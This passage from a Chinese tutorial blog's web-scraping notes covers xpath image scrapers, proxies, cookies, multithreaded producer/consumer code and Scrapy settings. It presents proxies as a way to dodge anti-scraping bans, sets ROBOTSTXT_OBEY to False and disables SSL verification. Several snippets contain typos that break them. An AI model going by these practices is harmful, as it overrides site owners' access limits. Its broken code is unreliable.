class=\"headerlink\" title=\"xpath代码实战示例：\"></a>xpath代码实战示例：</h3><pre><code class=\"python\">#爬取妹子图片，总共有俩千多张\nimport requests\nfrom lxml import etree\nimport os\n\nif __name__ == &#39;__main__&#39;:\n    ii = 1\n    if not os.path.exists(&#39;./girl&#39;):\n        os.mkdir(&#39;./girl&#39;)\n    url_list = [i for i in range(1, 50)]\n    url_list[1] = &#39;&#39;\n\n    for page in url_list:\n        url = &#39;https://www.lanvshen.com/zhongguo/&#39; + str(page) +&#39;.html&#39;\n        headers = &#123;\n            &#39;User-Agent&#39; : &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#39;\n        &#125;\n        get_text = requests.get(url=url, headers=headers)\n        tree = etree.HTML(get_text.text)\n        pict_ = tree.xpath(&#39;//div[@class=&quot;hezi&quot;]//li&#39;)\n        for it_ in pict_:\n            img_url = it_.xpath(&#39;./a/img/@src&#39;)[0]\n            img_name = str(ii) + &#39;.jpg&#39;\n            img = requests.get(url=img_url, headers=headers).content\n            img_path = &#39;./girl/&#39; + img_name\n            with open(img_path, &#39;wb&#39;) as fp:\n                fp.write(img)\n            print(img_name + &#39;sccuessful...&#39;)\n            ii = ii + 1\n\n##此代码存在许多不足之处，所爬取的图片都只是像素低的缩略图，并且下载速度较慢\n##后期将学习爬取高清图片，并进行分布式爬取\n</code></pre>\n<h3 id=\"ip代理\"><a href=\"#ip代理\" class=\"headerlink\" title=\"ip代理\"></a>ip代理</h3><ol>\n<li>代理的原理：在请求目的网站之前，先请求代理服务器，然后让代理服务器去请求目的网站，<br>代理服务器拿到目的网站的数据后，再转发给我们的代码</li>\n<li><a href=\"http://httpbin.org\">这个网站可以方便的查看http请求的一些参数</a> </li>\n<li>在代码中(requests模块)使用代理：</li>\n</ol>\n<pre><code class=\"python\">    import requests\n\n    url = &#39;http://httpbin.org&#39;\n    headers = &#123;\n        &#39;User-Anget&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#39;\n    &#125;\n\n    #设置代理\n    proxy = &#123;\n        &#39;http&#39;: &#39;123.54.194.96:38661&#39;\n    &#125;\n    get_text = requerts.get(url=url, headers=headers, proxies=proxy).text\n    print(get_text)</code></pre>\n<ol start=\"4\">\n<li>网络代理有付费和不需要付费的，不需要付费的不稳定，常常会失效</li>\n<li>代理的作用是防止我们在爬取服务器的数据时被反爬虫而被封禁导致我们<br>的 ip 不能用而采取的措施，选择代理应选择隐蔽性高，不透明的</li>\n</ol>\n<h3 id=\"cookie\"><a href=\"#cookie\" class=\"headerlink\" title=\"cookie\"></a>cookie</h3><ul>\n<li><p><a href=\"http://blog.sina.com.cn/s/blog_628571e601019uis.html\">cookie与session的差异</a></p>\n</li>\n<li><p><a href=\"http://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&mid=200538817&idx=2&sn=1147d48f2320fa37e82a7daef4f31c11#rd\">cookie技术深入</a>             </p>\n<ul>\n<li>Cookie是什么？     </li>\n</ul>\n<p>Cookie 是一小段文本信息，伴随着用户请求和页面在 Web 服务器和浏览器之间传递。<br>Cookie 包含每次用户访问站点时 Web 应用程序都可以读取的信息。</p>\n<ul>\n<li><p>为什么需要Cookie？ </p>\n<p>因为HTTP协议是无状态的，对于一个浏览器发出的多次请求，WEB服务器无法区分 是不是来源于同一个浏览器。<br>所以，需要额外的数据用于维护会话。Cookie 正是这样的一段随HTTP请求一起被传递的额外数据。</p>\n</li>\n<li><p>Cookie能做什么？ </p>\n<p>Cookie只是一段文本，所以它只能保存字符串。而且浏览器对它有大小限制以及 它会随着每次请求被发送到服务器，所以应该保证它<br>不要太大。Cookie的内容也是明文保存的，有些浏览器提供界面修改，所以， 不适合保存重要的或者涉及隐私的内容。</p>\n</li>\n<li><p>Cookie 的限制</p>\n<p>大多数浏览器支持最大为 4096 字节的 Cookie。由于这限制了 Cookie 的大小，最好用 Cookie 来存储少量数据，<br>或者存储用户 ID 之类的标识符。用户 ID 随后便可用于标识用户，以及从数据库或其他数据源中读取用户信息。<br>浏览器还限制站点可以在用户计算机上存储的 Cookie 的数量。大多数浏览器只允许每个站点存储 20 个 Cookie；<br>如果试图存储更多 Cookie，则最旧的 Cookie 便会被丢弃。有些浏览器还会对它们将接受的来自所有站点的 Cookie<br>总数作出绝对限制，通常为 300 个。</p>\n</li>\n</ul>\n</li>\n</ul>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"C:/Users/Acer/Desktop/%E7%AC%94%E8%AE%B0/%E7%88%AC%E8%99%AB_day4_files/1.jpg\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"Cookie示意图\">    </p>\n<ul>\n<li>处理cookie<br>如果想要在多次请求中共享cookie，那么应该使用session</li>\n</ul>\n<h3 id=\"处理不信任的SSL证书\"><a href=\"#处理不信任的SSL证书\" class=\"headerlink\" title=\"处理不信任的SSL证书\"></a>处理不信任的SSL证书</h3><pre><code class=\"python\">resp = resquests.get(url=url, vrrify=False).content\n</code></pre>\n<h3 id=\"多线程\"><a href=\"#多线程\" class=\"headerlink\" title=\"多线程\"></a>多线程</h3><ul>\n<li>多线程之生产者与消费者模型</li>\n</ul>\n<ul>\n<li>代码示例一：(Lock版)</li>\n</ul>\n<pre><code class=\"python\">    &quot;&quot;&quot;\n    关于多线程生产者消费者模型\n    &quot;&quot;&quot;\n    import threading\n    import time\n    import random\n\n    gMoney = 1000\n    gLock = threading.Lock()\n    gTotalTimes = 10\n    gTimes = 0\n\n\n    # 生产线程Producer\n    class Producer(threading.Thread):\n        def run(self):\n            global gMoney\n            global gTimes\n            while True:\n                money = random.randint(100, 1000)\n                gLock.acquire()\n                if gTimes &gt;= gTotalTimes:\n                    gLock.release()\n                    break\n                gMoney += money\n                print(&#39;&#123;&#125;生产了&#123;&#125;元钱，剩余&#123;&#125;元钱&#39;\n                      .format(threading.current_thread(), money, gMoney))\n                gTimes += 1\n                gLock.release()\n                time.sleep(0.5)\n\n\n    # 消费线程Consumer\n    class Consumer(threading.Thread):\n        def run(self):\n            global gMoney\n            while True:\n                money = random.randint(100, 1000)\n                gLock.acquire()\n                if gMoney &gt;= money:\n                    gMoney -= money\n                    print(&#39;&#123;&#125;消费者消费了&#123;&#125;元钱，剩余&#123;&#125;元钱&#39;\n                          .format(threading.current_thread(), money, gMoney))\n                # 若剩余金额不足以消费，则退出循环\n                else:\n                    if gTimes &gt;= gTotalTimes:\n                        gLock.release()\n                        break\n                    print(&#39;&#123;&#125;消费者准备消费&#123;&#125;元钱，剩余&#123;&#125;元钱，不足！&#39;\n                          .format(threading.current_thread(), money, gMoney))\n                gLock.release()\n                time.sleep(0.5)\n\n\n    def mainIt():\n        # 设置3个消费线程\n        for x in range(3):\n            t = Consumer(name=&#39;消费者线程&#123;&#125;&#39;.format(x))\n            t.start()\n            # 设置5个生产线程\n\n        for x in range(5):\n            t = Producer(name=&#39;生产者线程&#123;&#125;&#39;.format(x))\n            t.start()\n\n\n    if __name__ == &#39;__main__&#39;:\n        mainIt()\n</code></pre>\n<ul>\n<li>代码示例二：(condition版)</li>\n</ul>\n<pre><code class=\"python\">\n    import threading\n    import random\n    import time\n\n    gMoney = 1000\n    gCondition = threading.Condition()  # 等同于threading.Lock\n    gTimes = 0\n    gTotalTimes = 5\n\n\n    class Producer(threading.Thread):\n        def run(self):\n            global gMoney\n            global gCondition\n            global gTimes\n            while True:\n                money = random.randint(100, 1000)\n                gCondition.acquire()  # 加锁（全局变量改变前（gMoney））\n                if gTimes &gt;= gTotalTimes:\n                    gCondition.release()  # 解锁\n                    print(&quot;当前生产者总共生产了%s次&quot; % gTimes)\n                    break\n                gMoney += money\n                print(&quot;%s当前存入%s元钱，剩余%s元线&quot; % (threading.current_thread(), money, gMoney))\n                gTimes += 1\n                gCondition.notify_all()  # 通知正在等待的线程（wait）\n                gCondition.release()\n                time.sleep(0.5)\n\n\n    class Cosumer(threading.Thread):\n        def run(self):\n            global gMoney\n            while True:\n                money = random.randint(100, 1000)\n                gCondition.acquire()\n                while gMoney &lt; money:\n                    if gTimes &gt;= gTotalTimes:\n                        gCondition.release()\n                        return\n                    print(&quot;%s准备消费%d元钱，剩余%d元钱，不足&quot; % (threading.current_thread(), money, gMoney))\n                    gCondition.wait()  # 等待状态  （获取锁） 直到生产者把钱加上 （有钱了再去排队消费）\n                gMoney -= money\n                print(&quot;%s消费了%d元钱，剩余%d元钱&quot; % (threading.current_thread(), money, gMoney))\n                gCondition.release()\n                time.sleep(0.5)\n\n\n    def main():\n        for x in range(3):\n            t = Cosumer(name=&quot;消费者线程%s&quot; % x)\n            t.start()\n        for y in range(5):\n            t1 = Producer(name=&quot;生产者线程%s&quot; % y)\n            t1.start()\n\n\n    if __name__ == &#39;__main__&#39;:\n        main()\n</code></pre>\n<ul>\n<li>多线程Lock与condition方法总结：<ol>\n<li>在上述的例子中，lock方法虽然实现了多线程的使用，但是当消费者资金不足时，程序在当前线程会重新whlie True，<br>这就导致了该线程需要再次上锁和解锁，这就导致了CPU的浪费</li>\n<li>当我们使用condition方法时，每当消费者资金不足，该线程无需重新while True，也不需要再次的上锁和解锁，<br>使用wait()，使当资金不足时的消费者线程在wait()暂停并解锁，等待条件满足时再次从wait()处开始执行，这样就<br>减少了循环过程中因上锁解锁而导致的CPu资源浪费</li>\n</ol>\n</li>\n</ul>\n<ul>\n<li>Queue线程安全队列<br>在线程中，访问一些全局变量，枷锁是一个经常的过程，如果你是想把某个数据存储到某个队列中，那么python内置了一个线程安全的模块<br>叫做queue模块。python中的queue模块中提供了同步的、线程安全的模块，其中队列Queue为先进先出，实现了原子操作，即要么不做，要<br>么做完。可使用队列来实现线程的同步。相关函数如下：<br>作用：<br>　　　解耦：使程序直接实现松耦合，修改一个函数，不会有串联关系。<br>　　　提高处理效率：ＦＩＦＯ　＝　现进先出，ＬＩＦＯ　＝　后入先出。</li>\n</ul>\n<ol>\n<li><p>Queue.Queue(maxsize=0)   FIFO， 如果maxsize小于1就表示队列长度无限</p>\n</li>\n<li><p>Queue.LifoQueue(maxsize=0)   LIFO， 如果maxsize小于1就表示队列长度无限</p>\n</li>\n<li><p>Queue.qsize()   返回队列的大小</p>\n</li>\n<li><p>Queue.empty()   如果队列为空，返回True,反之False</p>\n</li>\n<li><p>Queue.full()   如果队列满了，返回True,反之False</p>\n</li>\n<li><p>Queue.get([block[, timeout]])   读队列，取出数据 ，没有数据将会等待timeout等待时间</p>\n</li>\n<li><p>Queue.put(item, [block[, timeout]])   写队列，放入数据，timeout等待时间</p>\n</li>\n<li><p>Queue.queue.clear()   清空队列</p>\n</li>\n<li><p>class queue.PriorityQueue(maxsize=0) 存储数据时可设置优先级的队列，优先级设置数越小等级越高</p>\n</li>\n<li><p>Queue.get(timeout = 1)如果1秒后没取到数据就退出</p>\n</li>\n<li><p>Queue.get_nowait() 取数据，如果没数据抛queue.Empty异常</p>\n</li>\n<li><p>Queue.task_done()后续调用告诉队列，任务的处理是完整的。</p>\n</li>\n</ol>\n<pre><code class=\"python\">    from queue import Queue\n    import time\n    import threading\n\n\n    # 在队列中放入数值\n    def set_value(q):\n        index = 0\n        while True:\n            q.put(index)\n            index += 1\n            time.sleep(0.8)\n\n\n    # 取出队列中的数值\n    def get_value(q):\n        while True:\n            print(q.get())\n\n\n    def main():\n        # 产生一个队列\n        q = Queue(1)\n        t1 = threading.Thread(target=set_value, args=[q])\n        t2 = threading.Thread(target=get_value, args=[q])\n\n        t1.start()\n        t2.start()\n\n\n    if __name__ == &#39;__main__&#39;:\n        main()\n</code></pre>\n<ul>\n<li>生产者与消费者模型</li>\n</ul>\n<ul>\n<li>代码示例三：(Queue版)</li>\n</ul>\n<pre><code class=\"python\">    import threading,time\n    #python2  from Queue import Queue\n    #python3\n    import queue\n\n    class Producer(threading.Thread):\n        def run(self):\n            global queue\n            count = 0\n            while True:\n                #qsize返回queue内部长度\n                if queue.qsize() &lt; 1000:\n                    for i in range(100):\n                        count += 1\n                        msg = &#39;生成产量&#39;+str(count)\n                        #put是往queue中放入\n                        queue.put(msg)\n                        print(msg)\n                time.sleep(0.5)\n    class Consumer(threading.Thread):\n        def run(self):\n            global queue\n            while True:\n                if queue.qsize() &gt; 100:\n                    for i in range(3):\n                        #get从queue中取出一个值\n                        msg = self.name + &quot;消费了&quot;+queue.get()\n                        print(msg)\n                time.sleep(1)\n    if __name__ == &#39;__main__&#39;:\n        queue = queue.Queue()\n        for i in range(500):\n            queue.put(&quot;初始产品&quot;+str(i))\n        for i in range(2):\n            p = Producer()\n            p.start()\n        for i in range(5):\n            c = Consumer()\n            c.start()\n</code></pre>\n<h3 id=\"爬虫之多线程\"><a href=\"#爬虫之多线程\" class=\"headerlink\" title=\"爬虫之多线程\"></a>爬虫之多线程</h3><ul>\n<li>多线程爬虫框架代码</li>\n</ul>\n<pre><code class=\"python\">    import requests\n    from lxml import etree\n    import os\n    import re\n    from queue import Queue\n    import threading\n\n    &quot;&quot;&quot; \n    我们引入了threading这个包，我们将使用这个包中的\n    Thread类，并在我们自定义的类中继承这个Thread类\n    &quot;&quot;&quot;\n\n\n    # 生产者线程\n    class Procuder(threading.Thread):\n        headers = &#123;\n                &#39;User-Agent&#39;: &#39;... 浏览器...&#39;\n        &#125;\n\n        &quot;&quot;&quot; 重写继承于父类的__init__方法 &quot;&quot;&quot;\n        &quot;&quot;&quot; 我们继承了Thread这个类，在调用类中的方法时可能需要许多参数，我们用*args和**kwargs来接收&quot;&quot;&quot;\n        def __init__(self, page_queue, img_queue, *args, **kwargs):\n            super(Procuder, self).__init__(*args, **kwargs)\n            self.page_queue = page_queue\n            self.img_queue = img_queue\n\n        &quot;&quot;&quot; 重写继承于父类的run方法，改成我们想要的方法&quot;&quot;&quot;\n        &quot;&quot;&quot; 从存放每页的url的队列中逐一挑出一个url并传入parse_page中\n            获取每页的url\n        &quot;&quot;&quot;\n        def run(self):\n            while True:\n                if self.page_queue.empty():\n                    break\n                url = self.page_queue.get()\n                self.parse_page(url)\n\n        def parse_page(self, url):\n            &quot;&quot;&quot; \n            .......\n\n            获取每页的响应数据，并从中提取出每张图片的\n            url和name，并放入队列中\n            &quot;&quot;&quot;\n\n\n    # 消费者线程\n    class Consumer(threading.Thread):\n        def __init__(self, page_queue, img_queue, *args, **kwargs):\n            super(Procuder, self).__init__(*args, **kwargs)\n            self.page_queue = page_queue\n            self.img_queue = img_queue\n\n        def run(self):\n            while True:\n                if self.img_queue.empty() and self.page_queue.empty():\n                    break\n                    &quot;&quot;&quot;\n                    ......\n\n                    利用从队列中获取的每张图片的url和name，进行图片的获取和永久储存\n                    &quot;&quot;&quot;\n\n    def main():\n        &quot;&quot;&quot; 设置页数和图片的url队列&quot;&quot;&quot;\n        page_queue = Queue()\n        img_queue = Queue()\n\n        # 将每页的url放到页数队列中\n        for x in range(1, 101):\n            url = &#39;http://........ %d&#39; % x\n            page_queue.put(url)\n\n        # 设置5个生产者线程\n        for x in range(5):\n            t = Procuder(page_queue, img_queue)\n            t.start()\n\n        # 设置5个消费者线程\n        for x in range(5):\n            t = Consumer(page_queue, img_queue)\n            t.start()\n\n\n    if __name__ == &#39;__main__&#39;:\n        main()\n</code></pre>\n<ul>\n<li>多线程爬虫实战代码</li>\n</ul>\n<pre><code class=\"python\">    import requests\n    import re\n    from lxml import etree\n    import threading\n    import os\n    import queue\n    from urllib import request\n\n    # 生产图片的url和name\n    class ProimgUrl(threading.Thread):\n        def __init__(self, page_queue, img_queue, headers, *args, **kwargs):\n            super().__init__(*args, **kwargs)\n            self.page_queue = page_queue\n            self.img_queue = img_queue\n            self.headers = headers\n\n        def run(self):\n            while True:\n                if self.page_queue.empty():\n                    break\n                else:\n                    url = self.page_queue.get()\n                    self.parse_page(url)\n\n        def parse_page(self, url):\n            img_get = requests.get(url=url, headers=self.headers).text\n            tree = etree.HTML(img_get)\n            img_it = tree.xpath(&#39;//div[@class=&quot;page-content text-center&quot;]//a&#39;)\n            for it in img_it:\n                img_url = it.xpath(&#39;./img[@class!=&quot;gif&quot;]/@data-original&#39;)[0]\n                alt = it.xpath(&#39;./img/@alt&#39;)[0]\n                alt = re.sub(r&#39;[\\?？.!！，。\\/\\*]&#39;, &#39;&#39;, alt)\n                # 利用splitext截取图片的后缀名\n                suffix = os.path.splitext(img_url)[1]\n                img_name = alt + suffix\n                self.img_queue.put((img_url, img_name))\n\n\n    # 获取图片并储存\n    class ConimgName(threading.Thread):\n        def __init__(self, page_queue, img_queue, headers, *args, **kwargs):\n            super().__init__(*args, **kwargs)\n            self.page_queue = page_queue\n            self.img_queue = img_queue\n            self.headers = headers\n\n        def run(self):\n            while True:\n                if self.img_queue.empty() and self.page_queue.empty():\n                    break\n                else:\n                    img_url, img_name = self.img_queue.get()\n                    # 用urlli包下的request.urlretrieve模块，可以更方便的获取和存储图片\n                    request.urlretrieve(img_url, &#39;./smile/&#39;+img_name)\n                    print(img_name + &#39; 下载成功...&#39;)\n\n    def main():\n        if not os.path.exists(&#39;./smile&#39;):\n            os.mkdir(&#39;./smile&#39;)\n        headers = &#123;\n            &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &#39;\n                          &#39;Chrome/80.0.3987.149 Safari/537.36 &#39;\n        &#125;\n        page_queue = queue.Queue(100)\n        img_queue = queue.Queue(1000)\n\n        for x in range(1, 10):\n            url = &#39;https://www.doutula.com/photo/list/?page=&#39; + str(x)\n            page_queue.put(url)\n\n        for i in range(5):\n            t = ProimgUrl(page_queue, img_queue, headers)\n            t.start()\n\n        for i in range(5):\n            t = ConimgName(page_queue, img_queue, headers)\n            t.start()\n\n\n    if __name__ == &#39;__main__&#39;:\n        main()\n</code></pre>\n<ul>\n<li>多线程爬虫的一些坑：多线程爬虫爬取的内容是无序的</li>\n</ul>\n<h1 id=\"爬虫第五天\"><a href=\"#爬虫第五天\" class=\"headerlink\" title=\"爬虫第五天\"></a>爬虫第五天</h1><h2 id=\"scrapy爬虫框架\"><a href=\"#scrapy爬虫框架\" class=\"headerlink\" title=\"scrapy爬虫框架\"></a>scrapy爬虫框架</h2><p><a href=\"https://zhuanlan.zhihu.com/p/25443389\">关于xpath选择器selector的网址</a></p>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"https://img-blog.csdnimg.cn/20200328091921480.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"scrapy框架示意图\"></p>\n<ol>\n<li><p>创建项目</p>\n<p>​    scrapy startproject #^%#^(项目名字)</p>\n</li>\n</ol>\n<ol start=\"2\">\n<li><p>创建爬虫</p>\n<p>​    scrapy genspider 爬虫名字 网络域名</p>\n<p>注意：</p>\n<ul>\n<li>爬虫名字不要和项目名字一样</li>\n<li>网站域名是允许爬虫采集的域名<ul>\n<li>baidu.com</li>\n</ul>\n</li>\n</ul>\n</li>\n</ol>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"https://img-blog.csdn.net/20180704211604860?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMzNDcyNzY1/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"创建项目与配置环境后各部分组件\"></p>\n<p>item文件是存储数据的</p>\n<ul>\n<li><p>在setting文件（程序启动被首先检查的文件）</p>\n</li>\n<li><p>BOT_NAME = 爬虫的名字</p>\n</li>\n<li><p>ROBOTSTXT_OBEY = 网络君子协议君子协议（不遵守）， 布尔</p>\n</li>\n<li><p>CONCURRENT_REQUESTS = 爬虫的并发量</p>\n</li>\n<li><p>DOWOLOAD_DELAY = 下载延迟，一般是1.5或2，小项目不用管</p>\n</li>\n<li><p>COOKLES_ENABLED = cookiede的使用，布尔</p>\n</li>\n<li><p>DEFAULT_REQUEST_HEADERS = 默认请求头</p>\n</li>\n<li><p>ITEM_PIPELINES = 管道文件</p>\n</li>\n</ul>\n<h3 id=\"setting文件详解\"><a href=\"#setting文件详解\" class=\"headerlink\" title=\"setting文件详解\"></a>setting文件详解</h3><pre><code class=\"python\">  # -*- coding: utf-8 -*-\n\n  # Scrapy settings for TestSpider project\n  #\n  # For simplicity, this file contains only settings considered important or\n  # commonly used. You can find more settings consulting the documentation:\n  #\n  #     https://doc.scrapy.org/en/latest/topics/settings.html\n  #     https://doc.scrapy.org/en/latest/topics/downloader-middleware.html\n  #     https://doc.scrapy.org/en/latest/topics/spider-middleware.html\n\n  BOT_NAME = &#39;TestSpider&#39;\n\n  SPIDER_MODULES = [&#39;TestSpider.spiders&#39;]\n  NEWSPIDER_MODULE = &#39;TestSpider.spiders&#39;\n\n\n  # Crawl responsibly by identifying yourself (and your website) on the user-agent\n  #USER_AGENT = &#39;TestSpider (+http://www.yourdomain.com)&#39;\n\n  USER_AGENT = &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0&#39;\n\n  # Obey robots.txt rules\n  # Scrapy框架默认遵守 robots.txt 协议规则，robots规定了一个网站中，哪些地址可以请求，哪些地址不能请求。\n  # 默认是True，设置为False不遵守这个协议。\n  ROBOTSTXT_OBEY = False\n\n\n  # Configure maximum concurrent requests performed by Scrapy (default: 16)\n  # 配置scrapy的请求连接数，默认会同时并发16个请求。\n  # CONCURRENT_REQUESTS = 10\n\n  # Configure a delay for requests for the same website (default: 0)\n  # See https://doc.scrapy.org/en/latest/topics/settings.html#download-delay\n  # See also autothrottle settings and docs\n\n  # 下载延时，请求和请求之间的间隔，降低爬取速度，default: 0\n  # DOWNLOAD_DELAY = 3\n\n\n  # CONCURRENT_REQUESTS_PER_DOMAIN：针对网站(主域名)设置的最大请求并发数。\n  # CONCURRENT_REQUESTS_PER_IP：某一个IP的最大请求并发数。\n  # The download delay setting will honor only one of:\n  # CONCURRENT_REQUESTS_PER_DOMAIN = 16\n  # CONCURRENT_REQUESTS_PER_IP = 16\n\n\n  # Disable cookies (enabled by default)\n  # 是否启用Cookie的配置，默认是可以使用Cookie的。主要是针对一些网站是禁用Cookie的。\n  # COOKIES_ENABLED = False\n\n  # Disable Telnet Console (enabled by default)\n  #TELNETCONSOLE_ENABLED = False\n\n\n  # Override the default request headers:\n\n  # 配置默认的请求头Headers.\n  # DEFAULT_REQUEST_HEADERS = &#123;\n  #   &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,\n  #   &#39;Accept-Language&#39;: &#39;en&#39;,\n  # &#125;\n\n\n  # Enable or disable spider middlewares\n  # See https://doc.scrapy.org/en/latest/topics/spider-middleware.html\n\n  # 配置自定义爬虫中间件，scrapy也默认启用了一些爬虫中间件，可以在这个配置中关闭。\n  # SPIDER_MIDDLEWARES = &#123;\n  #    &#39;TestSpider.middlewares.TestspiderSpiderMiddleware&#39;: 543,\n  # &#125;\n\n\n  # 下载中间件，配置自定义的中间件或者取消Scrapy默认启用的中间件。\n  # Enable or disable downloader middlewares\n  # See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html\n  # DOWNLOADER_MIDDLEWARES = &#123;\n  #    &#39;TestSpider.middlewares.TestspiderDownloaderMiddleware&#39;: 543,\n  # &#125;\n\n\n  # Enable or disable extensions\n  # See https://doc.scrapy.org/en/latest/topics/extensions.html\n  # EXTENSIONS = &#123;\n  #    &#39;scrapy.extensions.telnet.TelnetConsole&#39;: None,\n  # &#125;\n\n\n  # Configure item pipelines\n  # See https://doc.scrapy.org/en/latest/topics/item-pipeline.html\n\n  # 配置自定义的PIPELINES，或者取消PIPELINES默认启用的中间件。\n  # ITEM_PIPELINES = &#123;\n  #    &#39;TestSpider.pipelines.TestspiderPipeline&#39;: 300,\n  # &#125;\n\n\n  # 限速配置\n  # Enable and configure the AutoThrottle extension (disabled by default)\n  # See https://doc.scrapy.org/en/latest/topics/autothrottle.html\n\n  # 是否开启自动限速\n  # AUTOTHROTTLE_ENABLED = True\n\n\n  # The initial download delay\n  # 配置初始url的下载延时\n  # AUTOTHROTTLE_START_DELAY = 5\n\n\n  # The maximum download delay to be set in case of high latencies\n  # 配置最大请求时间\n  # AUTOTHROTTLE_MAX_DELAY = 60\n\n\n  # 配置请求和请求之间的下载间隔，单位是秒\n  # The average number of requests Scrapy should be sending in parallel to\n  # each remote server\n  # AUTOTHROTTLE_TARGET_CONCURRENCY = 1.0\n\n\n  # Enable showing throttling stats for every response received:\n  # AUTOTHROTTLE_DEBUG = False\n\n\n  # 关于Http缓存的配置，默认是不启用。\n  # 对于同一个页面的请求进行数据的缓存，如果后续还有相同的请求，直接从缓存中进行获取。\n  # Enable and configure HTTP caching (disabled by default)\n  # See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html#httpcache-middleware-settings\n  #HTTPCACHE_ENABLED = True\n  #HTTPCACHE_EXPIRATION_SECS = 0\n  #HTTPCACHE_DIR = &#39;httpcache&#39;\n  #HTTPCACHE_IGNORE_HTTP_CODES = []\n  #HTTPCACHE_STORAGE = &#39;scrapy.extensions.httpcache.FilesystemCacheStorage&#39;</code></pre>\n<h3 id=\"scrapy爬虫之spider类（示例-一：爬取糗事百科）\"><a href=\"#scrapy爬虫之spider类（示例-一：爬取糗事百科）\" class=\"headerlink\" title=\"scrapy爬虫之spider类（示例 一：爬取糗事百科）\"></a>scrapy爬虫之spider类（示例 一：爬取糗事百科）</h3><ul>\n<li><p>创建爬虫项目：scrapy startproject xiushi</p>\n</li>\n<li><p>创建爬虫文件:   scrapy genSpider xiushiSpider  qiushidabaike.com</p>\n<h4 id=\"item-部分\"><a href=\"#item-部分\" class=\"headerlink\" title=\"item 部分\"></a>item 部分</h4><pre><code class=\"python\"># -*- coding: utf-8 -*-\n\n# Define here the models for your scraped items\n#\n# See documentation in:\n# https://doc.scrapy.org/en/latest/topics/items.html\n\nimport scrapy\n\n</code></pre>\n</li>\n</ul>\n<p>  class XiushiItem(scrapy.Item):<br>      # define the fields for your item here like:<br>      # name = scrapy.Field()<br>      title = scrapy.Field()<br>      text = scrapy.Field()</p>\n<pre><code>\n  #### setting 部分\n\n  ```python\n  # -*- coding: utf-8 -*-\n\n  # Scrapy settings for xiushi project\n  #\n  # For simplicity, this file contains only settings considered important or\n  # commonly used. You can find more settings consulting the documentation:\n  #\n  #     https://doc.scrapy.org/en/latest/topics/settings.html\n  #     https://doc.scrapy.org/en/latest/topics/downloader-middleware.html\n  #     https://doc.scrapy.org/en/latest/topics/spider-middleware.html\n\n  BOT_NAME = &#39;xiushi&#39;\n\n  SPIDER_MODULES = [&#39;xiushi.spiders&#39;]\n  NEWSPIDER_MODULE = &#39;xiushi.spiders&#39;\n\n  # Crawl responsibly by identifying yourself (and your website) on the user-agent\n  # USER_AGENT = &#39;xiushi (+http://www.yourdomain.com)&#39;\n\n  # Obey robots.txt rules\n  ROBOTSTXT_OBEY = False\n\n  # Configure maximum concurrent requests performed by Scrapy (default: 16)\n  # CONCURRENT_REQUESTS = 32\n\n  # Configure a delay for requests for the same website (default: 0)\n  # See https://doc.scrapy.org/en/latest/topics/settings.html#download-delay\n  # See also autothrottle settings and docs\n  DOWNLOAD_DELAY = 1\n  # The download delay setting will honor only one of:\n  # CONCURRENT_REQUESTS_PER_DOMAIN = 16\n  # CONCURRENT_REQUESTS_PER_IP = 16\n\n  # Disable cookies (enabled by default)\n  # COOKIES_ENABLED = False\n\n  # Disable Telnet Console (enabled by default)\n  # TELNETCONSOLE_ENABLED = False\n\n  # Override the default request headers:\n  DEFAULT_REQUEST_HEADERS = &#123;\n      &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,\n      &#39;Accept-Language&#39;: &#39;en&#39;,\n      &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &#39;\n                    &#39;Chrome/80.0.3987.163 Safari/537.36 &#39;\n  &#125;\n\n  # Enable or disable spider middlewares\n  # See https://doc.scrapy.org/en/latest/topics/spider-middleware.html\n  # SPIDER_MIDDLEWARES = &#123;\n  #    &#39;xiushi.middlewares.XiushiSpiderMiddleware&#39;: 543,\n  # &#125;\n\n  # Enable or disable downloader middlewares\n  # See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html\n  # DOWNLOADER_MIDDLEWARES = &#123;\n  #    &#39;xiushi.middlewares.XiushiDownloaderMiddleware&#39;: 543,\n  # &#125;\n\n  # Enable or disable extensions\n  # See https://doc.scrapy.org/en/latest/topics/extensions.html\n  # EXTENSIONS = &#123;\n  #    &#39;scrapy.extensions.telnet.TelnetConsole&#39;: None,\n  # &#125;\n\n  # Configure item pipelines\n  # See https://doc.scrapy.org/en/latest/topics/item-pipeline.html\n  ITEM_PIPELINES = &#123;\n     &#39;xiushi.pipelines.XiushiPipeline&#39;: 300,\n  &#125;\n\n  # Enable and configure the AutoThrottle extension (disabled by default)\n  # See https://doc.scrapy.org/en/latest/topics/autothrottle.html\n  # AUTOTHROTTLE_ENABLED = True\n  # The initial download delay\n  # AUTOTHROTTLE_START_DELAY = 5\n  # The maximum download delay to be set in case of high latencies\n  # AUTOTHROTTLE_MAX_DELAY = 60\n  # The average number of requests Scrapy should be sending in parallel to\n  # each remote server\n  # AUTOTHROTTLE_TARGET_CONCURRENCY = 1.0\n  # 